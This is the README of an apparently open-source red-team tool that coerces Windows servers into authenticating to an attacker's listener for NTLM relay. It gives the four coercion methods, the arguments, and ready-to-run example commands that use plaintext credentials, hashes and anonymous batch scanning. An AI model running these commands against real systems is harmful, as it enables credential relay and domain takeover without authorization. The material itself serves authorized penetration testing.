# PrinterBug Pro
[English](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/README.md) | [中文](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/assets/README_zh.md) | [Français](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/assets/README_fr.md)
`redteam` `ntlm-relay` `windows` `pentest` `coercion` `c2` `mit-license`

Enhanced multi-method Windows authentication coercion tool, fully compatible with original printerbug.py.
## Features
- 100% backward compatible with all original printerbug.py arguments, drop-in replacement
- 4 built-in coercion methods: MS-RPRN (PrinterBug, default), MS-EFSR (PetitPotam), MS-FSRVP (ShadowCoerce), MS-DFSNM (DFSCoerce)
- Auto mode to try all available methods sequentially
- Automatic SMB signing detection to indicate NTLM relay feasibility
- Batch target scanning with progress tracking
- Fixed all original script bugs: new impacket logging error, `-no-ping` logic inversion, incorrect access denied handling
- No extra dependencies, single file script
## Installation
```bash
git clone https://github.com/RedteamNotes/Printerbug-Pro.git
cd Printerbug-Pro
pip3 install impacket
chmod +x printerbug_pro.py
```
## Usage
### Syntax
```bash
python3 printerbug_pro.py [[domain/]username[:password]@]<target> <listener> [options]
```
### Arguments
| Argument | Description |
|----------|-------------|
| target | Target address, format: `[[domain/]username[:password]@]<IP/hostname>` |
| listener | Your listener IP/hostname to receive NTLM authentication |
| --verbose | Enable debug output |
| --method | Coercion method: `printerbug`(default), `petitpotam`, `shadowcoerce`, `dfscoerce`, `all` |
| -target-file | File with targets (one per line, lines starting with `#` are ignored) |
| -port | SMB port, default 445 |
| -timeout | Connection timeout in seconds, default 3 |
| -no-ping | Skip TCP ping check before connection |
| -hashes | NTLM hashes for authentication, format `LMHASH:NTHASH` |
| -no-pass | Do not prompt for password, for anonymous access |
| -k | Use Kerberos authentication |
| -dc-ip | Domain controller IP address |
| -target-ip | Target IP address when using hostname |
### Examples
```bash
# Classic PrinterBug
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20
# PetitPotam method
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20 --method petitpotam
# Auto try all methods
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20 --method all
# Anonymous coercion
python3 printerbug_pro.py 'DOMAIN\'@10.10.10.10 10.10.10.20 --no-pass
# NTLM hash authentication
python3 printerbug_pro.py domain/user@10.10.10.10 10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# Batch scan from file
python3 printerbug_pro.py ''@$placeholder 10.10.10.20 -target-file targets.txt --no-pass --method all
```
## Supported Methods
| Method | Protocol | Pipe | Notes |
|--------|----------|------|-------|
| PrinterBug | MS-RPRN | `\pipe\spoolss` | Classic spooler bug, works when Print Spooler service is running |
| PetitPotam | MS-EFSR | `\pipe\efsrpc` | Works on most Windows versions even if spooler is disabled |
| ShadowCoerce | MS-FSRVP | `\pipe\FssagentRpc` | Works on Server versions with VSS service enabled |
| DFSCoerce | MS-DFSNM | `\pipe\netdfs` | Works on domain controllers and DFS servers |
## Disclaimer
This tool is for authorized security testing and red team operations only. Unauthorized access to computer systems is illegal. Authors are not liable for any misuse or damage caused by this program.
## Credits
- Original PrinterBug by Dirk-jan Mollema (@_dirkjan)
- PetitPotam by @topotam77
- ShadowCoerce by @ShutdownRepo
- DFSCoerce by @filip_dragovic